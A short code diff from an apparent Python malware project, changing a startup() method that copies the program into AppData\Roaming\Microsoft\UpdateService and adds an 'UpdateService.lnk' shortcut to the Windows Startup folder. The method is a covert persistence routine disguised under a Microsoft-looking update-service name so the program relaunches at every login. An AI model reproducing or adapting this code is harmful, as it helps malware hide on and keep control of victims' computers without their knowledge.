@@ -112,8 +112,7 @@ class main():
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
 
 	def startup(self):
-		try: shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
-		except: shutil.rmtree(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService"); self.startup()
+		shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
 		try: 
 			shell = win32com.client.Dispatch("WScript.Shell")
 			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
